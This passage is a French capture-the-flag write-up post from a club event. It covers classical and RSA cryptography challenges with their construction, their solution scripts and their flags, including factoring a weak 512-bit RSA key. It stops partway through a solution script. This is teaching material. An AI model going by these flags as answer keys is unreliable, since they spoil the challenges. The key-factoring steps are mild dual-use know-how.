---
layout: post
title: "EVENT_04 - Writeups"
categories: Events
excerpt_separator:  <!--more-->
---
<!--more-->

### Date : 24/09/2019 - 17h30 (<a href="https://slides.com/adelalm/event_04" target="_blank">slides</a>)

<details><summary><h3 style="display: inline;">Menu</h3></summary><ul>
<li><a href="#crypto_0100_32_32_64">crypto_0100_32_32_64</a></li>
<li><a href="#crypto_0200_easy_rsa">crypto_0200_easy_rsa</a></li>
<li><a href="#crypto_0200_strengthened_caesar">crypto_0200_strengthened_caesar</a></li>
<li><a href="#crypto_250_bdv">crypto_250_bdv</a></li>
<li><a href="#stega_350_decalage">stega_350_decalage</a></li>
<li><a href="#crypto_500_rsa">crypto_500_rsa</a></li>
<li><a href="#crypto_0800_rsa_server">crypto_0800_rsa_server</a></li>
<li><a href="#enc_050_quick_response_code">enc_050_quick_response_code</a></li>
<li><a href="#enc_050_wtf">enc_050_wtf</a></li>
<li><a href="#MISC_0150_Inutile_v4">MISC_0150_Inutile_v4</a></li>
<li><a href="#prog_0600_timing_attack">prog_0600_timing_attack</a></li>
<li><a href="#pwn_0200_overflow_1">pwn_0200_overflow_1</a></li>
<li><a href="#pwn_0400_overflow_2">pwn_0400_overflow_2</a></li>
<li><a href="#pwn_0600_overflow_3">pwn_0600_overflow_3</a></li>
<li><a href="#res_0300_offuscation">res_0300_offuscation</a></li>
<li><a href="#reverse_0200_reverse_1">reverse_0200_reverse_1</a></li>
<li><a href="#reverse_0400_reverse_2">reverse_0400_reverse_2</a></li>
<li><a href="#reverse_0600_reverse_3">reverse_0600_reverse_3</a></li>
<li><a href="#reverse_0800_reverse_4">reverse_0800_reverse_4</a></li>
<li><a href="#stega_0100_read_me">stega_0100_read_me</a></li>
<li><a href="#stega_0150_hidden_secret">stega_0150_hidden_secret</a></li>
<li><a href="#stega_0200_do_not_trust_me">stega_0200_do_not_trust_me</a></li>
<li><a href="#sonic_0200_sonic">sonic_0200_sonic</a></li>
<li><a href="#stega_0300_anti_sonic">stega_0300_anti_sonic</a></li>
<li><a href="#stega_300_biscuit">stega_300_biscuit</a></li>
<li><a href="#stega_300_extraction">stega_300_extraction</a></li>
<li><a href="#stega_0300_read_me_2">stega_0300_read_me_2</a></li>
<li><a href="#stega_0400_samuel">stega_0400_samuel</a></li>
<li><a href="#stega_0600_jacquouille_la_fripouille">stega_0600_jacquouille_la_fripouille</a></li>
<li><a href="#web_0050_the_beginning">web_0050_the_beginning</a></li>
<li><a href="#web_0050_the_beginning_su1t3">web_0050_the_beginning_su1t3</a></li>
<li><a href="#web_0250_r2d2">web_0250_r2d2</a></li>
<li><a href="#web_0400_sql_login">web_0400_sql_login</a></li>
<li><a href="#web_0200_extra_toxics_script">web_0200_extra_toxics_script</a></li>
</ul></details>

# crypto_0100_32_32_64

------

### Titre : 32 + 32 != 64

### Points : 100

------

### Description

------

A toi de jouer !

`JFHEURSTKVBVKSSGJJMFOM2CKRHU4UCVIVHEIVCHJZNFQMSDKE6QU===`

------

### Réalisation

------

Le but de ce challenge est d'introduire la base 32.

Pour réaliser ce challenge nous avons encodé deux fois le flag en base32:

```bash
$ echo 'CRYPTIS{l3s_B4s3s}' | base32 | base32
JFHEURSTKVBVKSSGJJMFOM2CKRHU4UCVIVHEIVCHJZNFQMSDKE6QU===
```

------

### Résolution

------

Pour résoudre ce challenge il suffit d'utiliser la commande suivante:

```bash
$ echo 'JFHEURSTKVBVKSSGJJMFOM2CKRHU4UCVIVHEIVCHJZNFQMSDKE6QU===' | base32 -d | base32 -d
CRYPTIS{l3s_B4s3s}
```

`CRYPTIS{l3s_B4s3s}`



# crypto_0200_easy_rsa

---

### Titre : Easy RSA

### Points : 200

---

### Description

---

Déchiffrez le `cipher` se trouvant dans `challenge.txt` en utilisant les paramètres fournis.

```bash
# challenge.txt
p=97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
q=92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
e=0x10001

cipher=1665494504932830744393167287434093789650604100675406546576462455819109651961563135070203723042005326693387748915861907164580522455389188781238444871998210591717673717825676654161827986115844377453320124075069355353812141849542060959665771493125434984599648354546051408074610447897156793282716187045206827536631551656959794312437671709060262838857335694067715295078628507446288392922307967974340479912508773005380159659206561381805444873433330365426859209178575628886875879157225700221008722049154389407365523345386266513977156092078394358336944075411782231284137844998995375160256382531179554395004147561076512715917
```

---

### Réalisation

---

Le but de ce challenge est d'introduire l'algorithme de chiffrement RSA. Nous allons utiliser le code suivant pour chiffrer notre flag: `CRYPTIS{RSA_1s_3verywh3re}`.

```python
#!/usr/bin/env python3

from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes

### encrypt with public key (n,e)
message = b'CRYPTIS{RSA_1s_3verywh3re}'
message = bytes_to_long(message) # string to integer
p = 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
q = 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559

n = p*q
phi = (p-1)*(q-1)
e = 0x10001

ciphertext = pow(message, e, n)
print(f'cipher -> {ciphertext}')

### decrypt with private key (d)
d = inverse(e, phi)

message = pow(ciphertext, d, n)
message = long_to_bytes(message) # integer to string
print(f'plaintext -> {message}')
```

```bash
$ python3 main.py 
cipher -> 1665494504932830744393167287434093789650604100675406546576462455819109651961563135070203723042005326693387748915861907164580522455389188781238444871998210591717673717825676654161827986115844377453320124075069355353812141849542060959665771493125434984599648354546051408074610447897156793282716187045206827536631551656959794312437671709060262838857335694067715295078628507446288392922307967974340479912508773005380159659206561381805444873433330365426859209178575628886875879157225700221008722049154389407365523345386266513977156092078394358336944075411782231284137844998995375160256382531179554395004147561076512715917
plaintext -> b'CRYPTIS{RSA_1s_3verywh3re}'
```

`p`, `q`, `e`, et `cipher` seront fournis pour le challenge.

---

### Résolution

---

Nous allons réutiliser le code qui a été présenté pour résoudre ce challenge en changeant les paramètres.

```python
#!/usr/bin/env python3
from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes

### decrypt with private key (d)
ciphertext = 1665494504932830744393167287434093789650604100675406546576462455819109651961563135070203723042005326693387748915861907164580522455389188781238444871998210591717673717825676654161827986115844377453320124075069355353812141849542060959665771493125434984599648354546051408074610447897156793282716187045206827536631551656959794312437671709060262838857335694067715295078628507446288392922307967974340479912508773005380159659206561381805444873433330365426859209178575628886875879157225700221008722049154389407365523345386266513977156092078394358336944075411782231284137844998995375160256382531179554395004147561076512715917
p = 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
q = 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
e = 0x10001
n = p*q
phi = (p-1)*(q-1)
d = inverse(e, phi)

message = pow(ciphertext, d, n)
message = long_to_bytes(message) # integer to string
print(f'plaintext -> {message}')
```

```bash
$ python3 resolv.py
plaintext -> b'CRYPTIS{RSA_1s_3verywh3re}'
```

`CRYPTIS{RSA_1s_3verywh3re}`

# crypto_0200_strengthened_caesar

------

### Titre : Strengthened Caesar

### Points : 200

------

### Description

------

1, 2, 3 ..., 26, 1, 2, 3 ... 

hq gvctxskvetlmi qj inollxksktz why lmkitiom jdbbr myxxe nzxxp xq puvsser rs rthpg ek cv ugvw wx wymul qjdm hao afccbobkqp lmkq drs vof ogvjqfg gh glmjjviqirx qj suz kl xiaam nbc mkockb td efuxx jrnx hfsg hxbeat

PS : le flag est composé de 4 mots, à relier ensemble avec des _

------

### Réalisation

On utilise un programme en python pour effectuer un chiffrement par décalage sur chaque mot, en augmentant le décalage de 1 après chaque mot jusqu'à 26.

```python
message = "en cryptographie le chiffrement par decalage aussi connu comme le chiffre de cesar ou le code de cesar voir les differents noms est une methode de chiffrement le mot de passe est caesar is still weak tres simple"
liste = message.split(" ")
new_liste = []
indice = 3

for mot in liste :
    new_mot = ""
    for lettre in mot :
        inter = ord(lettre) + indice
        if inter > 122 :
            inter = inter - 26
        new_mot = new_mot + chr(inter)
    new_liste.append(new_mot)
    indice = indice + 1
    if indice == 26 :
        indice = 1
```

------

### Résolution

------

Pour résoudre ce challenge, on utilise un programme python qui inversera le chiffrement par décalage sur le chiffré

```python
message = "hq gvctxskvetlmi qj inollxksktz why lmkitiom jdbbr myxxe nzxxp xq puvsser rs rthpg ek cv ugvw wx wymul qjdm hao afccbobkqp lmkq drs vof ogvjqfg gh glmjjviqirx qj suz kl xiaam nbc mkockb td efuxx jrnx hfsg hxbeat"
liste = message.split(" ")
old_liste = []
indice = 3

for new_mot in liste :
    mot = ""
    for lettre in new_mot :
        inter = ord(lettre) - indice
        if inter < 97 :
            inter = inter + 26
        mot = mot + chr(inter)
    old_liste.append(mot)
    indice = indice + 1
    if indice == 26 :
        indice = 1
```

`CRYPTIS{caesar_is_still_weak}`



# crypto_250_bdv

---

### Titre : BDV

### Points : 250

---

### Description

---

Bdv fête ses 64 ans et a reçu cette carte d'anniversaire : *VW13ZyBjc214ICEgRWkgdWF0cGR4Z2t3IHhseCBseGtxYWd4LiBaZ25sIHRnbm9pciBvdHBhd3h2IGR4IGZpa2x0a3cgVktDSE1CV3t1aGZmZ19vYmtfdHRsaV9ran0uIFdpayB1Yndnbmwh*

Veuillez l'aider à la lire.

---

### Réalisation

---

```
Bien joue ! Le challenge est termine. Vous pouvez valider le message CRYPTIS{combo_vig_base_sq}. Des bisous !
```

Utilisation du site [www.dcode.fr](www.dcode.fr)  afin de chiffrer le texte avec la clé `test` et en préservant la ponctuation :

```
Umwg csmx ! Ei uatpdxgkw xlx lxkqagx. Zgnl tgnoir otpawxv dx fikltkw VKCHMBW{uhffg_obk_ttli_kj}. Wik ubwgnl!
```

On va maintenant l'encoder en base64

```bash
$ echo -n 'Umwg csmx ! Ei uatpdxgkw xlx lxkqagx. Zgnl tgnoir otpawxv dx fikltkw VKCHMBW{uhffg_obk_ttli_kj}. Wik ubwgnl!' | base64
VW13ZyBjc214ICEgRWkgdWF0cGR4Z2t3IHhseCBseGtxYWd4LiBaZ25sIHRnbm9pciBvdHBhd3h2IGR4IGZpa2x0a3cgVktDSE1CV3t1aGZmZ19vYmtfdHRsaV9ran0uIFdpayB1Yndnbmwh
```

---

### Résolution

---

Plusieurs indices nous sont donnés dans le titre et l'énoncé : Une personne avec les initiales BDV et le nombre 64.

* Une personne célèbre de la cryptologie avec les initiales BDV : Blaise de Vigenère
* Le nombre 64 fait penser à la base64, confirmé par les caractères présents dans la carte d'anniversaire

On commence par décoder le chiffré :

```bash
$ echo -n 'VW13ZyBjc214ICEgRWkgdWF0cGR4Z2t3IHhseCBseGtxYWd4LiBaZ25sIHRnbm9pciBvdHBhd3h2IGR4IGZpa2x0a3cgVktDSE1CV3t1aGZmZ19vYmtfdHRsaV9ran0uIFdpayB1Yndnbmwh' | base64 -d
Umwg csmx ! Ei uatpdxgkw xlx lxkqagx. Zgnl tgnoir otpawxv dx fikltkw VKCHMBW{uhffg_obk_ttli_kj}. Wik ubwgnl!
```



Nous avons le choix entre une attaque par clair connu avec le tag `CRYPTIS` qui est certainement présent : *VKCHMBW{uhffg_obk_ttli_kj}*. Ainsi qu'une attaque par analyse statistique.

Les deux premières attaques peuvent être faites via le site [www.dcode.fr](www.dcode.fr) :

* **Attaque par clair connu** : le texte clair connu est  suffisant afin d'obtenir le flag
* **Attaque par analyse statistique** : Le site décrypte un texte totalement plausible en utilisant la clé *test* :

On obtient le clair suivant par l'attaque à clair connu :

```
Qudn yate ! Aq bhpxkecsdrmine. Vous pouvez valider le message CRYPTIS{combo_vig_base_sq}. Des bisous!
```

`CRYPTIS{combo_vig_base_sq}`

# stega_350_decalage

------

### Titre : Décalage

### Points : 350

------

### Description

------

Notre équipe a trouvé ce message : r#*!%x$Lc=Aw23bE0p>d=`_#tN.

Retrouvez sa signification !

------

### Réalisation

------

- Rot47(CRYPTIS{4lpHab3t_Am5l10RE}) = r#*!%x$Lc=Aw23bE0p>d=`_#tN
  - *Le chiffre ROT-47 est une variante du ROT-13 adaptée aux caractères ASCII, exactement à une liste de 94 caractères imprimables.*

------

### Résolution

---

Le chiffrement donné est très clairement donné : chiffrement par décalage.

Un rapide coup d'oeil au chiffré suffit à nous dissuader du chiffrement de césar. En effet l'alphabet utilisé est sur un alphabet plus grand que les 26 lettres.

Une petite recherche sur les chiffrements par décalages nous apprend qu'il existe en existe une multitude : chiffrement ROT-47, chiffrement Ascii ...

Le site https://gchq.github.io/CyberChef/ nous permet de manipuler aisément le chiffrement Rot-47. 

Avec l'utilisation d'un décalage de 47, on obtient : CRYPTIS{4lpHab3t_Am5l10RE}.

`CRYPTIS{4lpHab3t_Am5l10RE}`

# crypto_500_rsa

------

### Titre : RSA

### Points : 500

------

### Description

------

Ce chiffrement RSA en 512 bits est vulnérable à la factorisation.

Occupez-vous en !

------

### Réalisation

------

```bash
# Générer notre priv_key.pem
$ openssl genrsa -out priv_key.pem 512
Generating RSA private key, 512 bit long modulus
......++++++++++++
.......++++++++++++
e is 65537 (0x010001)
$ cat priv_key.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIBXwIBAAJJAMLLsk/b+SO2Emjj8Ro4lt5FdLO6WHMMvWUpOIZOIiPu63BKF8/Q
jRa0aJGmFHR1mTnG5Jqv5/JZVUjHTB1/uNJM0VyyO0zQowIDAQABAkgyAw5Cxp1O
d95+I5exPbouUvLFeiBfWXP+1vh2MvU8+IhmCf9j+hFOK13x22JJ+Orwv1+iatW4
5It/qwUNMvxXS0RuItCLp7ECJQDM6VRX8SfElUbleEECmsavcGBMZOgoEBisu1OC
M7tX83puaJUCJQDzXLgl8AM5bxHxSaWaD+c9tDFiyzBbjr/tpcqEC+JMU2tqrlcC
JQCjGt8+GQD0o3YJVc05i4W3RBYC+RcqPJXHeFyieRcYjP/ZPnkCJQDVUULBTl8l
KuzJWcrk/metuJNJi925g6lMwHSBxoD4cm7HtkUCJFqWTOzCIODw7eoypcJYjm2O
/ohEsSjEXsg6Bh8mY3LunBaqiA==
-----END RSA PRIVATE KEY-----

# Générer notre pub_key.pem, dérivée de priv_key.pem
$ openssl rsa -in priv_key.pem -pubout -out pub_key.pem
writing RSA key
$ cat pub_key.pem 
-----BEGIN PUBLIC KEY-----
MGQwDQYJKoZIhvcNAQEBBQADUwAwUAJJAMLLsk/b+SO2Emjj8Ro4lt5FdLO6WHMM
vWUpOIZOIiPu63BKF8/QjRa0aJGmFHR1mTnG5Jqv5/JZVUjHTB1/uNJM0VyyO0zQ
owIDAQAB
-----END PUBLIC KEY-----

# Créer notre fichier flag.txt
$ echo 'Bien joué ! CRYPTIS{rsa_factorisation}' > flag.txt

# Chiffrer notre flag.txt en flag.txt.enc avec pub_key.pem
$ openssl rsautl -encrypt -pubin -inkey pub_key.pem -in flag.txt -out ciphertext.txt

```

Pour ce challenge, nous fournirons les fichiers: `public_key.pem` et `ciphertext.txt`.

------

### Résolution

------

Ce challenge nous fournit 2 fichiers: `pub_key.pem` et `ciphertext.txt`.

Regardons rapidement le type des fichiers que l'on nous donne, ainsi que leur contenu:

```bash
$ file pub_key.pem
pub_key.pem: ASCII text
$ cat pub_key.pem
-----BEGIN PUBLIC KEY-----
MGQwDQYJKoZIhvcNAQEBBQADUwAwUAJJAMLLsk/b+SO2Emjj8Ro4lt5FdLO6WHMM
vWUpOIZOIiPu63BKF8/QjRa0aJGmFHR1mTnG5Jqv5/JZVUjHTB1/uNJM0VyyO0zQ
owIDAQAB
-----END PUBLIC KEY-----

$ file ciphertext.txt
ciphertext.txt: data
```

On peut en conclure que c'est bien RSA qui est utilisé dans ce challenge. 

Nous allons donc maintenant utiliser `openssl` afin de voir si **n** est factorisable et ainsi trouver la clé privée.

```bash
# Extraction de N et e
$ openssl rsa -in pub_key.pem -pubin -text -modulus 
RSA Public-Key: (576 bit)
Modulus:
    00:c2:cb:b2:4f:db:f9:23:b6:12:68:e3:f1:1a:38:
    96:de:45:74:b3:ba:58:73:0c:bd:65:29:38:86:4e:
    22:23:ee:eb:70:4a:17:cf:d0:8d:16:b4:68:91:a6:
    14:74:75:99:39:c6:e4:9a:af:e7:f2:59:55:48:c7:
    4c:1d:7f:b8:d2:4c:d1:5c:b2:3b:4c:d0:a3
Exponent: 65537 (0x10001)
Modulus=C2CBB24FDBF923B61268E3F11A3896DE4574B3BA58730CBD652938864E2223EEEB704A17CFD08D16B46891A61474759939C6E49AAFE7F2595548C74C1D7FB8D24CD15CB23B4CD0A3
writing RSA key
-----BEGIN PUBLIC KEY-----
MGQwDQYJKoZIhvcNAQEBBQADUwAwUAJJAMLLsk/b+SO2Emjj8Ro4lt5FdLO6WHMM
vWUpOIZOIiPu63BKF8/QjRa0aJGmFHR1mTnG5Jqv5/JZVUjHTB1/uNJM0VyyO0zQ
owIDAQAB
-----END PUBLIC KEY-----

# RSA 576 bits a été factorisé en 2003!
# Nous obtenons e = 65537 et n en base 16

# Décodage en base10 de N
$ python -c "print int('C2CBB24FDBF923B61268E3F11A3896DE4574B3BA58730CBD652938864E2223EEEB704A17CFD08D16B46891A61474759939C6E49AAFE7F2595548C74C1D7FB8D24CD15CB23B4CD0A3', 16)"
188198812920607963838697239461650439807163563379417382700763356422988859715234665485319060606504743045317388011303396716199692321205734031879550656996221305168759307650257059
```

On peut maintenant utiliser le site `factordb` afin de factoriser N.

- Calcul de `p` et `q` sur factordb
  - `p = 398075086424064937397125500550386491199064362342526708406385189575946388957261768583317`
  - `q = 472772146107435302536223071973048224632914695302097116459852171130520711256363590397527`
- `Rsatool.py` : calcul de `d` à partir des arguments donnés et recrée, ainsi, la clef privée

```bash
$ python rsatool.py -p 398075086424064937397125500550386491199064362342526708406385189575946388957261768583317 -q 472772146107435302536223071973048224632914695302097116459852171130520711256363590397527 -n 188198812920607963838697239461650439807163563379417382700763356422988859715234665485319060606504743045317388011303396716199692321205734031879550656996221305168759307650257059 -e 65537 -o private_key.pem

Using (p, q) to initialise RSA instance

n =
c2cbb24fdbf923b61268e3f11a3896de4574b3ba58730cbd652938864e2223eeeb704a17cfd08d16
b46891a61474759939c6e49aafe7f2595548c74c1d7fb8d24cd15cb23b4cd0a3

e = 65537 (0x10001)

d =
32030e42c69d4e77de7e2397b13dba2e52f2c57a205f5973fed6f87632f53cf8886609ff63fa114e
2b5df1db6249f8eaf0bf5fa26ad5b8e48b7fab050d32fc574b446e22d08ba7b1

p =
cce95457f127c49546e57841029ac6af70604c64e8281018acbb538233bb57f37a6e6895

q =
f35cb825f003396f11f149a59a0fe73db43162cb305b8ebfeda5ca840be24c536b6aae57

Saving PEM as private_key.pem

$ cat private_key.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIBXwIBAAJJAMLLsk/b+SO2Emjj8Ro4lt5FdLO6WHMMvWUpOIZOIiPu63BKF8/QjRa0aJGmFHR1
mTnG5Jqv5/JZVUjHTB1/uNJM0VyyO0zQowIDAQABAkgyAw5Cxp1Od95+I5exPbouUvLFeiBfWXP+
1vh2MvU8+IhmCf9j+hFOK13x22JJ+Orwv1+iatW45It/qwUNMvxXS0RuItCLp7ECJQDM6VRX8SfE
lUbleEECmsavcGBMZOgoEBisu1OCM7tX83puaJUCJQDzXLgl8AM5bxHxSaWaD+c9tDFiyzBbjr/t
pcqEC+JMU2tqrlcCJQCjGt8+GQD0o3YJVc05i4W3RBYC+RcqPJXHeFyieRcYjP/ZPnkCJQDVUULB
Tl8lKuzJWcrk/metuJNJi925g6lMwHSBxoD4cm7HtkUCJFqWTOzCIODw7eoypcJYjm2O/ohEsSjE
Xsg6Bh8mY3LunBaqiA==
-----END RSA PRIVATE KEY-----
```

```bash 
# Déchiffrement
$ openssl rsautl -decrypt -in ciphertext.txt -out plaintext.txt -inkey private_key.pem
$ cat plaintext.txt
Bien joué ! CRYPTIS{rsa_factorisation}
```

`CRYPTIS{rsa_factorisation}`

# crypto_0800_rsa_server

---

### Titre : RSA server

### Points : 800

---

### Description

---

Connectez-vous sur  `nc ctf.teamcryptis.fr 50004`, et répondez à toutes les questions afin d'obtenir le graal :)

---

### Réalisation

---

Le but de ce challenge est d'améliorer la compréhension de l'algorithme RSA. Ce challenge sera composé d'un serveur avec lequel il faudra discuter afin d'obtenir le flag. Cette discussion sera sous la forme de questions/réponses. Le but étant d'avoir toutes les bonnes réponses afin d'arriver sur la dernière question qui va indiquer comment avoir le flag. Les questions porteront sur des principes clés de RSA (sans jeu de mots): nombre premier, calculs de produits, d'inverse,….

Voici le code du serveur avec lequel il faudra discuter afin d'obtenir le flag. Il est composé de plusieurs questions, par exemple: on donne `p` et `q` et il faut répondre  si oui ou non les valeurs sont possibles, c'est-à-dire si `p`et `q`sont des nombres premiers, etc...

```python
#!/usr/bin/env python3

### Question 1 ###
q1_p = b'p=28423083049\n\n' # prime
q1_q = b'q=28423083050\n\n' # not prime

q1_poss = b'no\n'

### Question 2 ###
q2_p = b'p=94603\n\n' # prime
q2_q = b'q=93187\n\n' # prime

q2_poss = b'yes\n'
q2_n = b'8815769761\n'

### Question 3 ###
q3_p = b'p=81203\n\n' # prime
q3_n = b'n=6315400919\n\n'

q3_poss = b'yes\n'
q3_q = b'77773\n'

### Question 4 ###
q4_p = b'p=97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637\n\n' # prime
q4_q = b'q=92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894560\n\n' # not prime

q4_poss = b'no\n'

### Question 5 ###
q5_p = b'p=97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637\n\n' # prime
q5_q = b'q=92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559\n\n' # prime

q5_poss = b'yes\n'
q5_n = b'9010912747277787249738727439840427055736519196538871349093408340706668231808840540195374015916168031416186859836416053338250477003776576736854137538279810042409758765948034443613881324504120707334213544491046703922409406729564516371394804946909037646047891880347940067132730874804943893719672960932378043325067514786209219718314429979032869544980643978919561908707109629612202311323626173343456843249212057093980583352634168733656443959925428846968193413110401346035535595817965624054783296380268863401241570313602685481219583686719199499297832165308522137209299081956650614940546284136240753995440003473611843518083\n'

### Question 6 ###
q6_p = b'p=97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637\n\n'
q6_q = b'q=92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559\n\n'
q6_e = b'e=65537\n\n'

q6_poss = b'yes\n'
q6_d = b'1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729\n'

### Question 7 ###
q7_p = b'p=97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637\n\n'
q7_n = b'n=9010912747277787249738727439840427055736519196538871349093408340706668231808840540195374015916168031416186859836416053338250477003776576736854137538279810042409758765948034443613881324504120707334213544491046703922409406729564516371394804946909037646047891880347940067132730874804943893719672960932378043325067514786209219718314429979032869544980643978919561908707109629612202311323626173343456843249212057093980583352634168733656443959925428846968193413110401346035535595817965624054783296380268863401241570313602685481219583686719199499297832165308522137209299081956650614940546284136240753995440003473611843518083\n\n'
q7_e = b'e=65537\n\n'
q7_cipher = b'cipher=7235140920118168640416960584876265700932872320617849500114095646999110881297458145235227343180721092279908232249225621949066212780061076884548853791796777135431749608594015581047215936099128900528252681882862516451972130442648193322092936719672063685146721125732707728247211916672338161445586894121328825957348072714528575429028978274374212722979782789444348599831727928551180559563523396233067810627160346725281521256108039829657299614127356616814235759818379962005806447155634022780797152878739984675321509288330225629554303072560382395378073546481823465799657164558121906519832557412940274761513549111901278508052\n\n'

q7_poss = b'yes\n'
q7_plaintext = b'561711819220594430501559128455193300454533528677678378623972820270701707955423938310925311883645\n'

bad = b'\nBad answer :( Let\'s retry\n'

import socket, os, sys

access_mask = '' # filtre les clients, ici aucun n'est filtre
server_port = 6688

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)

# be able to re-use the port faslty
my_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

my_sock.bind((access_mask, server_port))

# configure the queue
my_sock.listen(socket.SOMAXCONN)

def treate_client(pid, cli_sock, tsap_cli):
    print ("New connection from: ", tsap_cli)
    try:
        # q1
        cli_sock.send(b'\n########## Question 1 ##########\n')
        cli_sock.send(q1_p)
        cli_sock.send(q1_q)
        cli_sock.send(b'Is it possible ? (yes/no) -> ')
        if cli_sock.recv(1024) != q1_poss:
            cli_sock.send(bad)
            exit(1)

        # q2
        cli_sock.send(b'\n########## Question 2 ##########\n')
        cli_sock.send(q2_p)
        cli_sock.send(q2_q)
        cli_sock.send(b'Is it possible ? (yes/no) -> ')
        if cli_sock.recv(1024) != q2_poss:
            cli_sock.send(bad)
            exit(1)
        cli_sock.send(b'Value of \'n\' ? -> ')
        if cli_sock.recv(1024) != q2_n:
            cli_sock.send(bad)
            exit(1)

        # q3
        cli_sock.send(b'\n########## Question 3 ##########\n')
        cli_sock.send(q3_p)
        cli_sock.send(q3_n)
        cli_sock.send(b'Is it possible ? (yes/no) -> ')
        if cli_sock.recv(1024) != q3_poss:
            cli_sock.send(bad)
            exit(1)
        cli_sock.send(b'Value of \'q\' ? -> ')
        if cli_sock.recv(1024) != q3_q:
            cli_sock.send(bad)
            exit(1)

        # q4
        cli_sock.send(b'\n########## Question 4 ##########\n')
        cli_sock.send(q4_p)
        cli_sock.send(q4_q)
        cli_sock.send(b'Is it possible ? (yes/no) -> ')
        if cli_sock.recv(1024) != q4_poss:
            cli_sock.send(bad)
            exit(1)

        # q5
        cli_sock.send(b'\n########## Question 5 ##########\n')
        cli_sock.send(q5_p)
        cli_sock.send(q5_q)
        cli_sock.send(b'Is it possible ? (yes/no) -> ')
        if cli_sock.recv(1024) != q5_poss:
            cli_sock.send(bad)
            exit(1)
        cli_sock.send(b'Value of \'n\' ? -> ')
        if cli_sock.recv(1024) != q5_n:
            cli_sock.send(bad)
            exit(1)

        # q6
        cli_sock.send(b'\n########## Question 6 ##########\n')
        cli_sock.send(q6_p)
        cli_sock.send(q6_q)
        cli_sock.send(q6_e)
        cli_sock.send(b'Is it possible ? (yes/no) -> ')
        if cli_sock.recv(1024) != q6_poss:
            cli_sock.send(bad)
            exit(1)
        cli_sock.send(b'Value of \'d\' ? -> ')
        if cli_sock.recv(1024) != q6_d:
            cli_sock.send(bad)
            exit(1)
        
        # q7
        cli_sock.send(b'\n########## Question 7 ##########\n')
        cli_sock.send(q7_p)
        cli_sock.send(q7_n)
        cli_sock.send(q7_e)
        cli_sock.send(q7_cipher)
        cli_sock.send(b'Is it possible ? (yes/no) -> ')
        if cli_sock.recv(1024) != q7_poss:
            cli_sock.send(bad)
            exit(1)
        cli_sock.send(b'Send the value of \'plaintext\' ? -> ')
        if cli_sock.recv(1024) != q7_plaintext:
            cli_sock.send(bad)
            exit(1)
        
        cli_sock.send(b'\n########## Congratulation ##########\n')
        cli_sock.send(b'Convert the plaintext to hex, then to ascii to get the flag :)')
        
        print ("Flag found by: ", tsap_cli)
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        print('Deconnection from: ', tsap_cli)
        cli_sock.close()


def main():
    while 1:
        (cli_sock, tsap_cli) = my_sock.accept()
        pid = os.fork()
        if not pid:
            treate_client(pid, cli_sock, tsap_cli)
    my_sock.close()

main()

```

---

### Résolution

---

En se connectant avec `netcat`avec sur `ctf.teamcryptis.fr`sur le port `50004` on obtient ce message:

```bash
$ nc ctf.teamcryptis.fr 50004

########## Question 1 ##########
p=28423083049

q=28423083050

Is it possible ? (yes/no) -> 
```

On doit répondre par `yes` ou `no` à  la question posée. Pour cela, on va utiliser le code python suivant qui fait toutes les étapes de RSA facilement:

```python
#!/usr/bin/env python3
from Crypto.Util.number import inverse

### encrypt with public key (n=3233,e=17)
message = 97
p = 61 # secret
q = 53 # secret

n = p*q
